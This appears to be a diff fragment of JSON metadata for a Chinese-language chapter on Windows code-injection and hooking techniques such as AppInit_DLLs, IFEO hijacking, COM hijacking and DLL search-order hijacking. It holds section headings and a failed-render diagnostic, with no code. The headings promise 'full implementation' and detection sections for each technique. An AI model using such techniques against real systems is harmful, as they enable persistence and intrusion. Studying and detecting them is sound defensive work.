+      "id": "section-70",
+      "level": 3,
+      "text": "关键对抗"
+    },
+    {
+      "id": "section-71",
+      "level": 3,
+      "text": "直接 syscall 最小示例（理解绕过逻辑）"
+    },
+    {
+      "id": "section-72",
+      "level": 2,
+      "text": "1.10 SetWindowsHookEx（Windows 消息钩子）"
+    },
+    {
+      "id": "section-73",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-74",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-75",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-76",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-77",
+      "level": 2,
+      "text": "1.11 AppInit_DLLs（注册表全局注入）"
+    },
+    {
+      "id": "section-78",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-79",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-80",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-81",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-82",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-83",
+      "level": 2,
+      "text": "1.12 IFEO（映像劫持 / 调试器重定向）"
+    },
+    {
+      "id": "section-84",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-85",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-86",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-87",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-88",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-89",
+      "level": 2,
+      "text": "1.13 IME 注入（输入法注入）"
+    },
+    {
+      "id": "section-90",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-91",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-92",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-93",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-94",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-95",
+      "level": 2,
+      "text": "1.14 Shim Engine Hook（应用兼容性引擎）"
+    },
+    {
+      "id": "section-96",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-97",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-98",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-99",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-100",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-101",
+      "level": 2,
+      "text": "1.15 COM Hijacking（COM 对象劫持）"
+    },
+    {
+      "id": "section-102",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-103",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-104",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-105",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-106",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-107",
+      "level": 2,
+      "text": "1.16 Winsock LSP（分层服务提供程序 Hook）"
+    },
+    {
+      "id": "section-108",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-109",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-110",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-111",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-112",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-113",
+      "level": 2,
+      "text": "1.17 DLL Search Order Hijacking（DLL 搜索顺序劫持）"
+    },
+    {
+      "id": "section-114",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-115",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-116",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-117",
+      "level": 3,
+      "text": "检测方法"
+    },
+    {
+      "id": "section-118",
+      "level": 2,
+      "text": "本章总结"
+    },
+    {
+      "id": "section-119",
+      "level": 3,
+      "text": "技术选型决策树"
+    },
+    {
+      "id": "section-120",
+      "level": 3,
+      "text": "学习路径建议"
+    },
+    {
+      "id": "section-121",
+      "level": 3,
+      "text": "核心认知"
+    },
+    {
+      "id": "section-122",
+      "level": 3,
+      "text": "推荐工具与资源"
+    }
+  ],
+  "diagnostics": [
+    {
+      "code": "RENDER_FAILED",
+      "severity": "error",
+      "blocksPublishing": true,
+      "location": null,
+      "message": "DOMPurify.addHook is not a function"
+    }
+  ],
+  "htmlRendered": null,
+  "renderStatus": "failed",
+  "publishable": false
+}
